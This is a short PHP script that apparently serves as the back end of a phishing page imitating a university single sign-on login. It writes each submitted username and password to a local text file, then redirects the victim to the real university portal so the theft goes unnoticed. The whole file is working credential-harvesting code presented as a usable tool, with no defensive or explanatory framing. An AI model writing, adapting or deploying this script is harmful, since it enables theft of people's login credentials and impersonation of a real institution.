<?php
// Redirect user to valid url to make it seem real
header ('Location:https://www.catalyst.uc.edu');
// Create or Open data.txt in appending mode
$data = fopen('data.txt', 'a');
// Write the username and password to the file
fwrite($data, 'username:');
fwrite($data, $_POST['j_username']);
// NOTE: must use " in order to use string escape characters
fwrite($data, "\tpassword:");
fwrite($data, $_POST['j_password']);
// NOTE: must use " in order to use string escape characters
fwrite($data, "\n");
// Close file
fclose($data);
exit;
?>